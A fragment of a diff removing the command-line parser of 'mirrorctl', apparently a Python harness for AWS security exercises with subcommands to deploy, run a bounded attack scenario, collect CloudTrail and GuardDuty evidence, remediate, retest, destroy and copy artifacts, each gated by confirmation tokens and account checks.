-    deploy = subparsers.add_parser("deploy", help="terraform plan and apply in a verified target account")
-    add_operational_arguments(deploy, "APPLY")
-    deploy.set_defaults(func=cmd_deploy)
-
-    attack = subparsers.add_parser("attack", help="execute the bounded scenario adapter")
-    add_operational_arguments(attack, "ATTACK")
-    attack.set_defaults(func=cmd_attack)
-
-    evidence = subparsers.add_parser("evidence", help="collect read-only CloudTrail and GuardDuty evidence")
-    add_operational_arguments(evidence, None)
-    evidence.set_defaults(func=cmd_evidence)
-
-    remediate = subparsers.add_parser("remediate", help="remove the vulnerable edge with Terraform")
-    add_operational_arguments(remediate, "FIX")
-    remediate.set_defaults(func=cmd_remediate)
-
-    retest = subparsers.add_parser("retest", help="repeat the first attack action and require denial")
-    add_operational_arguments(retest, "RETEST")
-    retest.set_defaults(func=cmd_retest)
-
-    destroy = subparsers.add_parser("destroy", help="destroy Terraform-managed mirror resources")
-    add_operational_arguments(destroy, "DESTROY")
-    destroy.set_defaults(func=cmd_destroy)
-
-    artifacts = subparsers.add_parser(
-        "artifacts",
-        help="collect approved Lambda/CloudFormation artifacts and optionally copy an EC2 AMI snapshot",
-    )
-    artifacts.add_argument("--run-dir", required=True, type=Path, help="generated scenario directory")
-    artifacts.add_argument("--source-profile", required=True, help="AWS CLI profile for the graph source account")
-    artifacts.add_argument("--target-profile", required=True, help="AWS CLI profile for the isolated target account")
-    artifacts.add_argument("--expected-target-account-id", required=True, help="exact 12-digit target account ID")
-    artifacts.add_argument(
-        "--include-ec2-snapshots",
-        action="store_true",
-        help="create a temporary no-reboot source AMI, copy it to target, then delete only the temporary source artifacts",
-    )
-    artifacts.add_argument("--approve", required=True, help="exact confirmation token: ARTIFACTS")
-    artifacts.set_defaults(func=cmd_artifacts)
-    return parser
-
-
-def main(argv: list[str] | None = None) -> int:
-    parser = build_parser()
-    args = parser.parse_args(argv)
-    try:
-        args.func(args)
-    except (PipelineError, OSError, json.JSONDecodeError, subprocess.TimeoutExpired) as exc:
-        print(f"mirrorctl: error: {exc}", file=sys.stderr)
-        return 2
-    return 0
-
-
-if __name__ == "__main__":
-    raise SystemExit(main())
